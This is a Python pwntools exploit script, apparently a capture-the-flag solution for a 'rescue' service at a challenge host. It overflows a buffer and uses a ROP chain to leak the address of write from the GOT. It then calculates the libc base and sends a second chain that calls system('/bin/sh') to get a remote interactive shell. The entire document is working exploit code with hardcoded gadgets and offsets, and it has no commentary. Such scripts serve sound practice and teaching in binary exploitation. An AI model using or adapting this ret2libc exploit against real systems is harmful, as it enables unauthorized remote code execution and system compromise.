from pwn import *
import sys

WRITE_OFF = 0xdbbf0
SYSTEM_OFF = 0x41490
BIN_SH_OFF = 0x1633e8

if len(sys.argv) > 1:
    debug = int(sys.argv[1])
else:
    debug = 0

if debug == 0:
    r = remote("rescueshell.challs.malice.fr", 6060)
elif debug == 1:
    r = process("./rescue")
    gdb.attach(r)
else:
    r = process("/usr/bin/strace ./rescue".split(" "), stderr=2)

r.recvuntil("Password:")

p = "A"*72
p += p64(0x400a8a)    # pop rbx;rbp;r12;r13;r14;r15;ret
p += p64(0)
p += p64(1)
p += p64(0x601218)    # write@got
p += p64(8)           # bytes to write
p += p64(0x601218)    # write@got
p += p64(1)           # fd
p += p64(0x400a70)    # mov rdx,r13...call [r12+rbx*8]
p += p64(0x400882)*64 # main

r.sendline(p)
write = u64(r.recvn(9)[1:])
libc_base = write - WRITE_OFF
system = libc_base + SYSTEM_OFF
binsh = libc_base + BIN_SH_OFF

log.info("libc: %x" % libc_base)
log.info("system: %x" % system)
log.info("/bin/sh: %x" % binsh)

p = "A"*72
p += p64(0x400a93)    # pop rdi; ret
p += p64(binsh)
p += p64(system)

r.sendline(p)
r.interactive()
